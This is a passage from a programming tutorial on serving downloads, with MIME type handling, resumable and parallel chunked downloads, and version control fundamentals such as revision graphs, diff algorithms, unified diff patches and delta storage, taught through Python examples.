        mime = magic.from_file(str(file_path), mime=True)
        if mime:
            return mime
    except:
        pass

    # Method 2: Extension-based
    content_type, _ = mimetypes.guess_type(str(file_path))
    if content_type:
        return content_type

    # Method 3: Default
    return "application/octet-stream"

# MIME types affect browser behavior:
MIME_BEHAVIORS = {
    "image/jpeg": "Display inline if possible",
    "image/png": "Display inline",
    "video/mp4": "Play with media controls",
    "application/pdf": "Open in PDF viewer",
    "text/html": "Render as web page (dangerous!)",
    "application/octet-stream": "Always download",
    "text/plain": "Display as text"
}

# Security: Force download for user content
def get_safe_content_type(file_path: Path, force_download: bool = True) -> str:
    """
    Get content type with security considerations.
    """
    detected = detect_content_type(file_path)

    if force_download:
        # For user-uploaded content, always use octet-stream
        # Prevents execution of malicious files
        if detected in ['text/html', 'application/javascript', 'text/javascript']:
            return "application/octet-stream"

    return detected
```

---

### **Practice Exercise 1: Implement Download Resumption**

```python
class DownloadManager:
    """
    Manage downloads with resumption support.

    Features:
    - Track download progress
    - Resume interrupted downloads
    - Verify file integrity (checksum)
    """

    def __init__(self):
        self.active_downloads = {}  # download_id → progress

    def start_download(self, filename: str, user_id: str) -> str:
        """
        Start new download.
        Returns download_id
        """
        # Your implementation
        pass

    def get_progress(self, download_id: str) -> dict:
        """
        Get download progress.
        Returns: {bytes_downloaded, total_bytes, percentage}
        """
        # Your implementation
        pass

    def resume_download(self, download_id: str, start_byte: int):
        """
        Resume download from specific byte.
        """
        # Your implementation
        pass

# Solution:
import hashlib
from pathlib import Path

class DownloadManager:
    def __init__(self, download_dir: str):
        self.download_dir = Path(download_dir)
        self.download_dir.mkdir(exist_ok=True)
        self.active_downloads = {}

    def start_download(self, filename: str, user_id: str) -> str:
        download_id = str(uuid.uuid4())

        file_path = Path(UPLOAD_DIR) / filename
        if not file_path.exists():
            raise ValueError("File not found")

        file_size = file_path.stat().st_size

        # Calculate checksum for verification
        checksum = self._calculate_checksum(file_path)

        self.active_downloads[download_id] = {
            "filename": filename,
            "user_id": user_id,
            "file_path": file_path,
            "file_size": file_size,
            "bytes_downloaded": 0,
            "checksum": checksum,
            "started_at": datetime.utcnow()
        }

        return download_id

    def _calculate_checksum(self, file_path: Path) -> str:
        """Calculate SHA-256 checksum of file."""
        sha256 = hashlib.sha256()

        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(1024 * 1024)  # 1 MB chunks
                if not chunk:
                    break
                sha256.update(chunk)

        return sha256.hexdigest()

    def get_progress(self, download_id: str) -> dict:
        if download_id not in self.active_downloads:
            raise ValueError("Download not found")

        dl = self.active_downloads[download_id]

        percentage = (dl["bytes_downloaded"] / dl["file_size"]) * 100

        return {
            "download_id": download_id,
            "filename": dl["filename"],
            "bytes_downloaded": dl["bytes_downloaded"],
            "total_bytes": dl["file_size"],
            "percentage": round(percentage, 2),
            "checksum": dl["checksum"]
        }

    def update_progress(self, download_id: str, bytes_downloaded: int):
        """Update download progress."""
        if download_id in self.active_downloads:
            self.active_downloads[download_id]["bytes_downloaded"] = bytes_downloaded

    async def stream_file(self, download_id: str, start_byte: int = 0):
        """
        Stream file with progress tracking.

        Generator that yields chunks and updates progress.
        """
        if download_id not in self.active_downloads:
            raise ValueError("Download not found")

        dl = self.active_downloads[download_id]
        file_path = dl["file_path"]

        async with aiofiles.open(file_path, 'rb') as f:
            # Seek to start position
            await f.seek(start_byte)

            bytes_sent = start_byte

            while True:
                chunk = await f.read(65536)
                if not chunk:
                    break

                bytes_sent += len(chunk)
                self.update_progress(download_id, bytes_sent)

                yield chunk

    def complete_download(self, download_id: str):
        """Mark download as complete and cleanup."""
        if download_id in self.active_downloads:
            del self.active_downloads[download_id]

# Usage in endpoint:
download_manager = DownloadManager("./downloads")

@app.get("/download/{filename}")
async def download_resumable(
    filename: str,
    range_header: Optional[str] = Header(None, alias="Range"),
    current_user: dict = Depends(get_current_user)
):
    # Start download
    download_id = download_manager.start_download(filename, current_user["id"])

    # Parse range
    file_path = Path(UPLOAD_DIR) / filename
    file_size = file_path.stat().st_size

    start_byte = 0
    if range_header:
        requested_range = parse_range_header(range_header, file_size)
        if requested_range:
            start_byte = requested_range.start

    # Stream with tracking
    return StreamingResponse(
        download_manager.stream_file(download_id, start_byte),
        status_code=206 if start_byte > 0 else 200,
        media_type="application/octet-stream",
        headers={
            "Content-Range": f"bytes {start_byte}-{file_size-1}/{file_size}",
            "Content-Length": str(file_size - start_byte),
            "Accept-Ranges": "bytes",
            "X-Download-ID": download_id
        }
    )
```

---

### **Practice Exercise 2: Implement Parallel Download Coordinator**

```python
class ParallelDownloadCoordinator:
    """
    Coordinate parallel downloads of file chunks.

    Client downloads multiple ranges simultaneously:
    - Thread 1: bytes 0-999999
    - Thread 2: bytes 1000000-1999999
    - Thread 3: bytes 2000000-2999999

    Server must handle concurrent range requests.
    """

    def generate_chunk_ranges(self, file_size: int, num_chunks: int) -> List[Range]:
        """
        Divide file into equal chunks.

        Example:
        file_size=1000, num_chunks=3
        Returns: [(0,333), (334,666), (667,999)]
        """
        # Your implementation
        pass

# Solution:
from typing import List
from dataclasses import dataclass

@dataclass
class ChunkRange:
    start: int
    end: int
    chunk_id: int

class ParallelDownloadCoordinator:
    def generate_chunk_ranges(self, file_size: int, num_chunks: int) -> List[ChunkRange]:
        """
        Divide file into roughly equal chunks.

        Time Complexity: O(n) where n = num_chunks
        """
        if num_chunks <= 0:
            raise ValueError("num_chunks must be positive")

        if file_size <= 0:
            raise ValueError("file_size must be positive")

        # Calculate chunk size
        chunk_size = file_size // num_chunks
        remainder = file_size % num_chunks

        ranges = []
        current_pos = 0

        for i in range(num_chunks):
            # Add 1 extra byte to first 'remainder' chunks
            size = chunk_size + (1 if i < remainder else 0)

            end = current_pos + size - 1

            # Last chunk goes to end of file (handle rounding)
            if i == num_chunks - 1:
                end = file_size - 1

            ranges.append(ChunkRange(
                start=current_pos,
                end=end,
                chunk_id=i
            ))

            current_pos = end + 1

        return ranges

    def verify_ranges_complete(self, ranges: List[ChunkRange], file_size: int) -> bool:
        """
        Verify all chunks cover entire file with no gaps.
        """
        if not ranges:
            return False

        # Sort by start position
        sorted_ranges = sorted(ranges, key=lambda r: r.start)

        # First chunk must start at 0
        if sorted_ranges[0].start != 0:
            return False

        # Last chunk must end at file_size-1
        if sorted_ranges[-1].end != file_size - 1:
            return False

        # Check for gaps between chunks
        for i in range(len(sorted_ranges) - 1):
            current_end = sorted_ranges[i].end
            next_start = sorted_ranges[i + 1].start

            if next_start != current_end + 1:
                return False  # Gap or overlap

        return True

# Test:
coordinator = ParallelDownloadCoordinator()

# Divide 1000 byte file into 3 chunks
ranges = coordinator.generate_chunk_ranges(1000, 3)
assert len(ranges) == 3
assert ranges[0] == ChunkRange(start=0, end=333, chunk_id=0)
assert ranges[1] == ChunkRange(start=334, end=666, chunk_id=1)
assert ranges[2] == ChunkRange(start=667, end=999, chunk_id=2)

# Verify complete coverage
assert coordinator.verify_ranges_complete(ranges, 1000)
```

---

Ready for Level 16 when you're ready. Next level will cover revision history, diff algorithms, version control concepts, and implementing a simple VCS for your files.

## **Level 16 Enhancement: Revision History - Version Control Fundamentals**

**Reference:** Your tutorial implements revision tracking for files, storing version history and allowing rollback to previous versions.

**Depth Needed:** Version control is one of the most important concepts in software engineering. We need to understand diff algorithms (finding differences between files), delta storage (efficiently storing changes), and the data structures that power systems like Git. This goes deep into graph theory, tree structures, and string algorithms.

---

### **Part 1: Version Control Fundamentals - The Core Concepts**

**What is Version Control?**

```
Version Control System (VCS) = Time machine for files

Capabilities:
1. Track changes: Who changed what, when, why
2. Revert: Undo changes to any point in time
3. Branch: Work on features independently
4. Merge: Combine changes from different branches
5. Blame/Annotate: See who wrote each line
6. History: View complete timeline of changes
```

**The Version Control Problem:**

```python
# Naive approach: Store full copy of each version
versions = {
    "v1": "Hello World",           # 11 bytes
    "v2": "Hello World!",          # 12 bytes
    "v3": "Hello World!\n",        # 13 bytes
    "v4": "Hello Beautiful World!\n"  # 23 bytes
}
# Total: 59 bytes for 4 versions

# Problem: 90% of content is duplicate!
# Only changes: "!" → "!\n" → " Beautiful"

# Better: Store deltas (changes only)
versions = {
    "v1": "Hello World",           # 11 bytes (full)
    "v2": "+!",                    # 2 bytes (delta)
    "v3": "+\n",                   # 2 bytes (delta)
    "v4": "~8 Beautiful",          # 11 bytes (replace at position 8)
}
# Total: 26 bytes (56% savings)
```

**VCS Architecture Patterns:**

```
1. Centralized VCS (CVS, Subversion)
   ┌────────────┐
   │   Server   │  ← Single source of truth
   │  (History) │
   └─────┬──────┘
         │
    ┌────┴────┬────────┐
    ↓         ↓        ↓
  Client1  Client2  Client3
  (Working) (Working) (Working)

  Pros: Simple, central control
  Cons: Single point of failure, requires network

2. Distributed VCS (Git, Mercurial)
   ┌────────────┐
   │  Remote    │
   │ Repository │
   └─────┬──────┘
         │
    ┌────┴────┬────────┐
    ↓         ↓        ↓
  ┌──────┐ ┌──────┐ ┌──────┐
  │ Repo │ │ Repo │ │ Repo │ ← Each has full history
  └───┬──┘ └───┬──┘ └───┬──┘
      ↓        ↓        ↓
   Working  Working  Working

  Pros: Works offline, faster, redundant
  Cons: More complex, larger storage
```

---

### **Part 2: Revision Data Model - The History Graph**

**Linear History (Simple):**

```
v1 → v2 → v3 → v4 → v5 (HEAD)
```

**Branching History (Real-World):**

```
        v3 → v4 → v5 (feature-branch)
       /
v1 → v2 → v6 → v7 (main)
       \
        v8 → v9 (bugfix-branch)
```

**Revision Data Structure:**

```python
from dataclasses import dataclass
from datetime import datetime
from typing import Optional, List

@dataclass
class Revision:
    """
    Represents a single version in history.

    Design based on Git's commit object.
    """
    revision_id: str          # Unique identifier (hash)
    parent_id: Optional[str]  # Previous revision (None for first)
    timestamp: datetime       # When created
    author: str              # Who created it
    message: str             # Commit message
    content_hash: str        # Hash of file content (for deduplication)
    file_size: int          # Size in bytes

    # For delta storage:
    storage_type: str       # "full" or "delta"
    delta_base: Optional[str]  # If delta, which revision it's based on

    def __repr__(self):
        return f"Revision({self.revision_id[:8]}... by {self.author})"

# Example history:
history = [
    Revision(
        revision_id="a1b2c3d4e5f6...",
        parent_id=None,  # First revision
        timestamp=datetime(2025, 1, 1, 12, 0),
        author="john@example.com",
        message="Initial version",
        content_hash="5d41402...",
        file_size=1024,
        storage_type="full",
        delta_base=None
    ),
    Revision(
        revision_id="b2c3d4e5f6a7...",
        parent_id="a1b2c3d4e5f6...",  # Links to previous
        timestamp=datetime(2025, 1, 2, 14, 30),
        author="jane@example.com",
        message="Added error handling",
        content_hash="7d93b2a...",
        file_size=1124,
        storage_type="delta",
        delta_base="a1b2c3d4e5f6..."  # Stored as delta from parent
    )
]
```

**History as Directed Acyclic Graph (DAG):**

```python
class RevisionGraph:
    """
    Represent version history as a DAG.

    Graph properties:
    - Directed: Edges point from child to parent
    - Acyclic: No cycles (can't depend on future versions)
    - May have multiple roots (orphaned branches)
    - May have multiple heads (active branches)
    """

    def __init__(self):
        self.revisions = {}  # revision_id → Revision
        self.children = {}   # revision_id → set of child revision_ids

    def add_revision(self, revision: Revision):
        """
        Add revision to graph.

        Time Complexity: O(1)
        """
        self.revisions[revision.revision_id] = revision

        # Update parent's children set
        if revision.parent_id:
            if revision.parent_id not in self.children:
                self.children[revision.parent_id] = set()
            self.children[revision.parent_id].add(revision.revision_id)

    def get_ancestors(self, revision_id: str) -> List[Revision]:
        """
        Get all ancestors (parent, grandparent, etc.) in order.

        Algorithm: Follow parent pointers backward
        Time Complexity: O(n) where n = depth in history
        """
        ancestors = []
        current_id = revision_id

        while current_id:
            revision = self.revisions.get(current_id)
            if not revision:
                break

            ancestors.append(revision)
            current_id = revision.parent_id

        return ancestors

    def get_path_between(self, from_id: str, to_id: str) -> Optional[List[str]]:
        """
        Find path from one revision to another.

        Uses BFS to find shortest path.
        Time Complexity: O(V + E) where V=revisions, E=edges
        """
        from collections import deque

        # BFS
        queue = deque([(from_id, [from_id])])
        visited = {from_id}

        while queue:
            current_id, path = queue.popleft()

            if current_id == to_id:
                return path

            # Check parent
            revision = self.revisions.get(current_id)
            if revision and revision.parent_id:
                if revision.parent_id not in visited:
                    visited.add(revision.parent_id)
                    queue.append((revision.parent_id, path + [revision.parent_id]))

            # Check children
            for child_id in self.children.get(current_id, []):
                if child_id not in visited:
                    visited.add(child_id)
                    queue.append((child_id, path + [child_id]))

        return None  # No path exists

    def find_common_ancestor(self, rev1_id: str, rev2_id: str) -> Optional[str]:
        """
        Find most recent common ancestor (MRCA).

        Used for merging branches.

        Algorithm:
        1. Get ancestors of rev1
        2. Walk back from rev2 until find one in rev1's ancestors

        Time Complexity: O(n) where n = depth
        """
        # Get all ancestors of rev1
        ancestors1 = set()
        current = rev1_id
        while current:
            ancestors1.add(current)
            revision = self.revisions.get(current)
            current = revision.parent_id if revision else None

        # Walk back from rev2 until find common ancestor
        current = rev2_id
        while current:
            if current in ancestors1:
                return current  # Found!

            revision = self.revisions.get(current)
            current = revision.parent_id if revision else None

        return None  # No common ancestor

# Usage:
graph = RevisionGraph()

# Build history
v1 = Revision("v1", None, datetime.now(), "john", "Initial", "hash1", 100, "full", None)
v2 = Revision("v2", "v1", datetime.now(), "jane", "Update", "hash2", 110, "delta", "v1")
v3 = Revision("v3", "v2", datetime.now(), "john", "Fix", "hash3", 115, "delta", "v2")

graph.add_revision(v1)
graph.add_revision(v2)
graph.add_revision(v3)

# Query history
ancestors = graph.get_ancestors("v3")
# Returns: [v3, v2, v1]
```

---

### **Part 3: Diff Algorithms - Finding Differences**

**The Diff Problem:**

```python
# Given two files, find the differences
file_v1 = ["line 1", "line 2", "line 3", "line 4"]
file_v2 = ["line 1", "line 2a", "line 3", "line 5"]

# Differences:
# - "line 2" changed to "line 2a"
# - "line 4" changed to "line 5"

# Or more precisely:
# - Delete "line 2", insert "line 2a"
# - Delete "line 4", insert "line 5"
```

**Myers Diff Algorithm (Industry Standard):**

```python
def myers_diff(old_lines: List[str], new_lines: List[str]) -> List[tuple]:
    """
    Myers diff algorithm - finds shortest edit script.

    Used by Git, SVN, and most diff tools.

    Algorithm overview:
    1. Build edit graph
    2. Find shortest path (minimize edits)
    3. Backtrack to construct edit sequence

    Time Complexity: O((M+N) × D) where:
    - M = len(old_lines)
    - N = len(new_lines)
    - D = size of diff (number of changes)

    Space Complexity: O(M+N)

    Best case (identical files): O(M+N)
    Worst case (completely different): O(M×N)
    """
    M, N = len(old_lines), len(new_lines)

    # Find the shortest edit script using dynamic programming
    max_d = M + N
    v = {1: 0}  # Furthest reaching path for each diagonal
    trace = []  # History of v for each iteration

    for d in range(max_d + 1):
        trace.append(v.copy())

        for k in range(-d, d + 1, 2):
            # Determine whether to move down or right
            if k == -d or (k != d and v[k - 1] < v[k + 1]):
                # Move down (delete from old)
                x = v[k + 1]
            else:
                # Move right (insert into new)
                x = v[k - 1] + 1

            y = x - k

            # Follow diagonal (matching lines)
            while x < M and y < N and old_lines[x] == new_lines[y]:
                x += 1
                y += 1

            v[k] = x

            # Check if reached end
            if x >= M and y >= N:
                # Backtrack to construct diff
                return backtrack_myers(old_lines, new_lines, trace, d)

    return []  # Should never reach here

def backtrack_myers(old_lines, new_lines, trace, d):
    """
    Backtrack through trace to construct edit sequence.

    Returns list of (operation, line) tuples:
    - ('keep', line): Line unchanged
    - ('delete', line): Removed from old
    - ('insert', line): Added to new
    """
    M, N = len(old_lines), len(new_lines)
    x, y = M, N

    edits = []

    for d_step in range(d, -1, -1):
        v = trace[d_step]
        k = x - y

        # Determine previous k
        if k == -d_step or (k != d_step and v[k - 1] < v[k + 1]):
            prev_k = k + 1
        else:
            prev_k = k - 1

        prev_x = v[prev_k]
        prev_y = prev_x - prev_k

        # Snake (diagonal moves - matching lines)
        while x > prev_x and y > prev_y:
            x -= 1
            y -= 1
            edits.append(('keep', old_lines[x]))

        # Edit
        if d_step > 0:
            if x == prev_x:
                # Insert
                y -= 1
                edits.append(('insert', new_lines[y]))
            else:
                # Delete
                x -= 1
                edits.append(('delete', old_lines[x]))

    return list(reversed(edits))

# Example usage:
old = ["The quick brown", "fox jumps over", "the lazy dog"]
new = ["The quick brown", "fox leaps over", "the lazy cat"]

diff = myers_diff(old, new)
# [
#     ('keep', "The quick brown"),
#     ('delete', "fox jumps over"),
#     ('insert', "fox leaps over"),
#     ('delete', "the lazy dog"),
#     ('insert', "the lazy cat")
# ]
```

**Visualizing the Edit Graph:**

```
Myers algorithm explores an edit graph:

Old lines →
  │   T h e   q u i c k
N ├─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬
e │ │ │ │ │ │ │ │ │ │ │
w │ ├─┼─┼─┼─┼─┼─┼─┼─┼─┤
  │ │ │ │ │ │ │ │ │ │ │
l │ ├─┼─┼─┼─┼─┼─┼─┼─┼─┤
i │ │ │ │ │ │ │ │ │ │ │
n │ └─┴─┴─┴─┴─┴─┴─┴─┴─┘
e
s
↓

Movements:
→ = Insert character from new
↓ = Delete character from old
↘ = Keep (characters match)

Goal: Find shortest path from (0,0) to (M,N)
Diagonal moves are "free" (no edit cost)
```

**Simplified Line-Based Diff:**

```python
def simple_diff(old_lines: List[str], new_lines: List[str]) -> List[dict]:
    """
    Simplified diff using LCS (Longest Common Subsequence).

    Easier to understand than Myers, but same complexity.

    Time Complexity: O(M×N)
    Space Complexity: O(M×N)
    """
    # Build LCS table
    M, N = len(old_lines), len(new_lines)

    # dp[i][j] = length of LCS of old_lines[:i] and new_lines[:j]
    dp = [[0] * (N + 1) for _ in range(M + 1)]

    for i in range(1, M + 1):
        for j in range(1, N + 1):
            if old_lines[i-1] == new_lines[j-1]:
                # Lines match - extend LCS
                dp[i][j] = dp[i-1][j-1] + 1
            else:
                # Lines differ - take max of two options
                dp[i][j] = max(dp[i-1][j], dp[i][j-1])

    # Backtrack to construct diff
    diff = []
    i, j = M, N

    while i > 0 or j > 0:
        if i > 0 and j > 0 and old_lines[i-1] == new_lines[j-1]:
            # Lines match
            diff.append({
                'type': 'keep',
                'line': old_lines[i-1],
                'old_line_num': i,
                'new_line_num': j
            })
            i -= 1
            j -= 1

        elif j > 0 and (i == 0 or dp[i][j-1] >= dp[i-1][j]):
            # Insert line from new
            diff.append({
                'type': 'insert',
                'line': new_lines[j-1],
                'new_line_num': j
            })
            j -= 1

        else:
            # Delete line from old
            diff.append({
                'type': 'delete',
                'line': old_lines[i-1],
                'old_line_num': i
            })
            i -= 1

    return list(reversed(diff))

# Example:
old = ["hello", "world", "foo"]
new = ["hello", "beautiful", "world"]

diff = simple_diff(old, new)
# [
#     {'type': 'keep', 'line': 'hello', 'old_line_num': 1, 'new_line_num': 1},
#     {'type': 'insert', 'line': 'beautiful', 'new_line_num': 2},
#     {'type': 'keep', 'line': 'world', 'old_line_num': 2, 'new_line_num': 3},
#     {'type': 'delete', 'line': 'foo', 'old_line_num': 3}
# ]
```

---

### **Part 4: Unified Diff Format - The Standard Representation**

**Unified Diff Format (diff -u):**

```diff
--- old_file.txt    2025-01-01 12:00:00
+++ new_file.txt    2025-01-02 14:30:00
@@ -1,4 +1,4 @@
 The quick brown
-fox jumps over
+fox leaps over
 the lazy dog
-EOF
+# End of file
```

**Format Breakdown:**

```
--- old_file.txt              ← Old file name
+++ new_file.txt              ← New file name
@@ -1,4 +1,4 @@               ← Chunk header
  │   │ │ │ │ └─ New: 4 lines starting at line 1
  │   │ │ └─ New: Starting line number
  │   │ └─ Old: 4 lines starting at line 1
  │   └─ Old: Starting line number
  └─ Chunk marker

 The quick brown               ← Context (unchanged)
-fox jumps over                ← Removed line (-)
+fox leaps over                ← Added line (+)
 the lazy dog                  ← Context (unchanged)
```

**Generating Unified Diff:**

```python
from datetime import datetime

def generate_unified_diff(
    old_lines: List[str],
    new_lines: List[str],
    old_name: str = "old.txt",
    new_name: str = "new.txt",
    context: int = 3
) -> str:
    """
    Generate unified diff format.

    Args:
        old_lines: Original file lines
        new_lines: Modified file lines
        old_name: Original filename
        new_name: New filename
        context: Number of context lines around changes

    Returns:
        Unified diff as string

    Time Complexity: O(M+N+D) where D = diff size
    """
    # Get diff
    diff = simple_diff(old_lines, new_lines)

    # Group into chunks (hunks)
    chunks = group_into_chunks(diff, context)

    # Build unified diff string
    output = []

    # Header
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    output.append(f"--- {old_name}\t{timestamp}")
    output.append(f"+++ {new_name}\t{timestamp}")

    # Chunks
    for chunk in chunks:
        # Chunk header
        old_start = chunk['old_start']
        old_count = chunk['old_count']
        new_start = chunk['new_start']
        new_count = chunk['new_count']

        output.append(f"@@ -{old_start},{old_count} +{new_start},{new_count} @@")

        # Chunk lines
        for line_info in chunk['lines']:
            line_type = line_info['type']
            line_content = line_info['line']

            if line_type == 'keep':
                output.append(f" {line_content}")
            elif line_type == 'delete':
                output.append(f"-{line_content}")
            elif line_type == 'insert':
                output.append(f"+{line_content}")

    return "\n".join(output)

def group_into_chunks(diff: List[dict], context: int) -> List[dict]:
    """
    Group diff into chunks with context lines.

    Algorithm:
    1. Find changed lines
    2. Add context lines before/after
    3. Merge overlapping chunks

    Time Complexity: O(n) where n = len(diff)
    """
    if not diff:
        return []

    chunks = []
    current_chunk = None

    for i, item in enumerate(diff):
        if item['type'] != 'keep':
            # Change found
            # Calculate chunk boundaries
            start = max(0, i - context)
            end = min(len(diff), i + context + 1)

            if current_chunk is None:
                # Start new chunk
                current_chunk = {
                    'start': start,
                    'end': end,
                    'lines': []
                }
            elif start <= current_chunk['end']:
                # Extend current chunk (overlaps)
                current_chunk['end'] = max(current_chunk['end'], end)
            else:
                # Gap too large - finalize current, start new
                finalize_chunk(current_chunk, diff)
                chunks.append(current_chunk)

                current_chunk = {
                    'start': start,
                    'end': end,
                    'lines': []
                }

    # Finalize last chunk
    if current_chunk:
        finalize_chunk(current_chunk, diff)
        chunks.append(current_chunk)

    return chunks

def finalize_chunk(chunk: dict, diff: List[dict]):
    """Calculate chunk metadata and extract lines."""
    start = chunk['start']
    end = chunk['end']

    chunk['lines'] = diff[start:end]

    # Count old and new lines
    old_count = sum(1 for item in chunk['lines']
                   if item['type'] in ['keep', 'delete'])
    new_count = sum(1 for item in chunk['lines']
                   if item['type'] in ['keep', 'insert'])

    # Find starting line numbers
    old_start = 1
    new_start = 1

    for item in diff[:start]:
        if item['type'] in ['keep', 'delete']:
            old_start += 1
        if item['type'] in ['keep', 'insert']:
            new_start += 1

    chunk['old_start'] = old_start
    chunk['old_count'] = old_count
    chunk['new_start'] = new_start
    chunk['new_count'] = new_count

# Example:
old = ["line 1", "line 2", "line 3", "line 4", "line 5"]
new = ["line 1", "line 2a", "line 3", "line 4", "line 5"]

diff_text = generate_unified_diff(old, new, "old.txt", "new.txt")
print(diff_text)
```

**Output:**

```diff
--- old.txt    2025-10-03 14:30:00
+++ new.txt    2025-10-03 14:30:00
@@ -1,5 +1,5 @@
 line 1
-line 2
+line 2a
 line 3
 line 4
 line 5
```

---

### **Part 5: Patch Application - Reconstructing Files**

**Applying a Patch:**

```python
def apply_patch(original_lines: List[str], patch: str) -> List[str]:
    """
    Apply unified diff patch to original file.

    Algorithm:
    1. Parse patch into chunks
    2. For each chunk:
       a. Find location in original
       b. Verify context matches
       c. Apply changes
    3. Return modified lines

    Time Complexity: O(n×m) where:
    - n = len(original_lines)
    - m = number of chunks

    Raises: PatchError if patch doesn't apply cleanly
    """
    # Parse patch
    chunks = parse_unified_diff(patch)

    # Apply each chunk
    result = original_lines.copy()
    offset = 0  # Track line number offset from insertions/deletions

    for chunk in chunks:
        # Adjust line numbers for previous changes
        old_start = chunk['old_start'] - 1 + offset  # Convert to 0-indexed

        # Verify context matches
        if not verify_chunk_context(result, chunk, old_start):
            raise PatchError(f"Patch doesn't apply cleanly at line {old_start + 1}")

        # Apply chunk
        new_lines = []
        chunk_offset = 0

        for line_info in chunk['lines']:
            if line_info['type'] == 'keep':
                new_lines.append(line_info['line'])
            elif line_info['type'] == 'insert':
                new_lines.append(line_info['line'])
                chunk_offset += 1
            elif line_info['type'] == 'delete':
                chunk_offset -= 1
                # Don't add to new_lines

        # Replace lines in result
        old_count = chunk['old_count']
        result[old_start:old_start + old_count] = new_lines

        # Update offset for next chunks
        offset += chunk_offset

    return result

def parse_unified_diff(patch: str) -> List[dict]:
    """
    Parse unified diff format into structured chunks.

    Returns list of chunk dictionaries.
    """
    lines = patch.split('\n')
    chunks = []
    current_chunk = None

    for line in lines:
        if line.startswith('@@'):
            # Chunk header
            # Extract: @@ -1,4 +1,5 @@
            import re
            match = re.match(r'@@ -(\d+),(\d+) \+(\d+),(\d+) @@', line)
            if match:
                current_chunk = {
                    'old_start': int(match.group(1)),
                    'old_count': int(match.group(2)),
                    'new_start': int(match.group(3)),
                    'new_count': int(match.group(4)),
                    'lines': []
                }
                chunks.append(current_chunk)

        elif current_chunk is not None:
            # Chunk content
            if line.startswith('-'):
                current_chunk['lines'].append({
                    'type': 'delete',
                    'line': line[1:]  # Remove '-'
                })
            elif line.startswith('+'):
                current_chunk['lines'].append({
                    'type': 'insert',
                    'line': line[1:]  # Remove '+'
                })
            elif line.startswith(' '):
                current_chunk['lines'].append({
                    'type': 'keep',
                    'line': line[1:]  # Remove ' '
                })

    return chunks

def verify_chunk_context(lines: List[str], chunk: dict, start: int) -> bool:
    """
    Verify chunk's context lines match the file.

    Ensures patch applies to correct location.
    """
    file_index = start

    for line_info in chunk['lines']:
        if line_info['type'] in ['keep', 'delete']:
            # These lines should exist in original
            if file_index >= len(lines):
                return False

            if lines[file_index] != line_info['line']:
                return False

            file_index += 1

    return True

class PatchError(Exception):
    """Raised when patch cannot be applied."""
    pass
```

---

### **Part 6: Delta Storage - Efficient Storage Strategy**

**Storage Strategies:**

```python
# Strategy 1: Store all full versions (Simple but wasteful)
storage_full = {
    "v1": read_file("v1.txt"),      # 1 MB
    "v2": read_file("v2.txt"),      # 1.01 MB (99% same as v1)
    "v3": read_file("v3.txt"),      # 1.02 MB (99% same as v2)
}
# Total: 3.03 MB

# Strategy 2: Forward deltas (Save space but slow to read latest)
storage_forward = {
    "v1": read_file("v1.txt"),      # 1 MB (full)
    "v2": diff("v1", "v2"),         # 10 KB (delta)
    "v3": diff("v2", "v3"),         # 10 KB (delta)
}
# Total: 1.02 MB
# To get v3: Apply v1→v2 delta, then v2→v3 delta (slow!)

# Strategy 3: Reverse deltas (Git's approach - fast for latest)
storage_reverse = {
    "v1": diff("v2", "v1"),         # 10 KB (reverse delta)
    "v2": diff("v3", "v2"),         # 10 KB (reverse delta)
    "v3": read_file("v3.txt"),      # 1 MB (full - latest version)
}
# Total: 1.02 MB
# To get v3: Direct access (fast!)
# To get v1: Apply v2→v1, then v3→v2 (slower, but old versions accessed rarely)
```

**Implementing Delta Storage:**

```python
import zlib
from pathlib import Path

class DeltaStorage:
    """
    Store file versions efficiently using deltas.

    Strategy: Store latest version as full, older as reverse deltas
    """

    def __init__(self, storage_dir: str):
        self.storage_dir = Path(storage_dir)
        self.storage_dir.mkdir(exist_ok=True)

    def store_revision(self, revision: Revision, content: bytes,
                       base_revision: Optional[Revision] = None):
        """
        Store new revision.

        Args:
            revision: Revision metadata
            content: File content
            base_revision: Previous revision (for delta)
        """
        if base_revision is None:
            # First revision - store full
            self._store_full(revision.revision_id, content)
            revision.storage_type = "full"
            revision.delta_base = None
        else:
            # Store as delta from base
            base_content = self.retrieve_revision(base_revision.revision_id)
            delta = self._compute_delta(base_content, content)

            # If delta is larger than full (rare but possible), store full
            if len(delta) > len(content) * 0.9:
                self._store_full(revision.revision_id, content)
                revision.storage_type = "full"
            else:
                self._store_delta(revision.revision_id, delta)
                revision.storage_type = "delta"
                revision.delta_base = base_revision.revision_id

    def _store_full(self, revision_id: str, content: bytes):
        """Store full file content (compressed)."""
        path = self.storage_dir / f"{revision_id}.full"

        # Compress with zlib
        compressed = zlib.compress(content, level=6)

        with open(path, 'wb') as f:
            f.write(compressed)

    def _store_delta(self, revision_id: str, delta: bytes):
        """Store delta (compressed)."""
        path = self.storage_dir / f"{revision_id}.delta"

        compressed = zlib.compress(delta, level=6)

        with open(path, 'wb') as f:
            f.write(compressed)

    def _compute_delta(self, old_content: bytes, new_content: bytes) -> bytes:
        """
        Compute binary delta between two versions.

        Uses simple format: [operation type][length][data]

        For production: Use established formats like:
        - VCDIFF (RFC 3284)
        - Git's packfile format
        - xdelta
        """
        # Simplified delta format
        # Real implementation would use more sophisticated algorithm

        # For now, just store the new content if different
        # (Real delta would find common subsequences)

        if old_content == new_content:
            return b''  # No change

        # Simple format: just new content with marker
        return b'REPLACE:' + new_content

    def retrieve_revision(self, revision_id: str,
                         revision_graph: RevisionGraph = None) -> bytes:
        """
        Retrieve file content for revision.

        Algorithm:
        1. Check if stored as full → return directly
        2. If delta:
           a. Get base revision
           b. Reconstruct base
           c. Apply delta

        Time Complexity: O(d) where d = delta chain depth
        """
        # Try full version first
        full_path = self.storage_dir / f"{revision_id}.full"
        if full_path.exists():
            with open(full_path, 'rb') as f:
                compressed = f.read()
            return zlib.decompress(compressed)

        # Try delta
        delta_path = self.storage_dir / f"{revision_id}.delta"
        if delta_path.exists():
            with open(delta_path, 'rb') as f:
                compressed = f.read()
            delta = zlib.decompress(compressed)

            # Need to reconstruct base first
            if revision_graph:
                revision = revision_graph.revisions[revision_id]
                if revision.delta_base:
                    base_content = self.retrieve_revision(
                        revision.delta_base,
                        revision_graph
                    )
                    return self._apply_delta(base_content, delta)

        raise ValueError(f"Revision {revision_id} not found")

    def _apply_delta(self, base: bytes, delta: bytes) -> bytes:
        """Apply delta to base to get new content."""
        if delta.startswith(b'REPLACE:'):
            return delta[8:]  # Remove marker

        return base  # No change

# Usage:
storage = DeltaStorage("./revisions")
graph = RevisionGraph()

# Store first version
